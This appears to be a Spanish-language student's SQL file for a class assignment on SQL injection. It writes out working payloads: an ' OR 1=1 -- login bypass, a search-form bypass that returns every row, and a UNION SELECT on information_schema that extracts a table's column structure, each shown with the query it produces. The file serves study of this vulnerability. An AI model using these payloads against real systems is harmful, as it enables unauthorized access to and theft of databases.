-- primera prueba en la tarea 11.01 de inyección SQL
-- Inyección SQL en login de usuario
' OR 1=1 
--  En usuario y contraseña vacía:

SELECT * from usuario where correo='' OR 1=1 -- ' && contraseña='';

-- en el formulario de buscar pregurta voy a scar todas la prenguntas en vez de una
' OR 1=1 -- 

  SELECT * FROM preguntas WHERE titulo='' OR 1=1 -- '


-- voy a sacar la estrucctura de la tabla pregunta (La inyeccion las estoy sacando de la ia aponyandome para ver como saco vulnerabilidad)
' UNION SELECT 
1,
concat('Columna: ',column_name,' | Tipo: ',data_type,' | Null: ',is_nullable),
3,
4,
5,
6
FROM information_schema.columns
WHERE table_name='preguntas' #

  SELECT * FROM preguntas WHERE titulo='' UNION SELECT 1, concat('Columna: ',column_name,' | Tipo: ',data_type,' | Null: ',is_nullable), 3, 4, 5, 6 FROM information_schema.columns WHERE table_name='preguntas' #'

